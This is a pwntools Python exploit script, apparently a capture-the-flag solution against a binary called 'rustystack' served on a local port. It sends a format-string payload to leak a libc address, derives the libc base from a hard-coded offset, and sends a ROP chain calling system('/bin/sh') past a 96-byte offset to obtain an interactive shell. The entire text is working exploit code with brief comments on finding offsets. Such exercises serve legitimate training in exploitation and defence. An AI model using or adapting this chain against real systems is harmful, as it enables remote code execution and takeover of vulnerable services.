#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./rustystack')
libc = ELF('./libc.so.6')

context.log_level = 'debug'
io = remote('127.0.0.1', 9002)

print(io.recvuntil(b"> "))

# Use fuzz.py to determine the offset where libc address is leaked via printf
io.sendline(b'%3$p')
data = io.recvline()
print(data)

data = data.replace(b"Here are the list of tools: ", b"")
leak = int(data, 16)
print(f"leak: {hex(leak)}")

# Use GDB "info proc mappings" OR "vmmap" to get address where libc.so.6 is loaded into memory
# pwndbg> x <__libc_start_main> - <address.leak>
libc_base = leak - 0x114a37
libc.address = libc_base

print(f"libc_addr @ {hex(libc.address)}")

print(io.recvuntil(b"> "))

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

io.sendline(flat({96: rop.chain()}))

io.interactive()